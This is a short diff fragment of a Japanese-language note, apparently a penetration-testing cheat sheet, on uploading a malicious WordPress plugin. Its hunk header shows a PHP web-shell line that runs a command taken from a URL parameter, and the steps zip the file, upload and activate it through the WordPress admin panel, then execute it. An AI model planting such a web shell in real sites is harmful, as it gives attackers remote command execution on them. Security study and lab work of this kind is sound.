@@ -160,7 +160,7 @@ echo sysetm($_GET["cmd"]);
 zip <output_name> <file>
 ```
 
-3. アップロード→Activate Plugin
+3. WordPress管理画面からプラグインをアップロード→Activate Plugin
 
 4. 格納先で実行
 ```
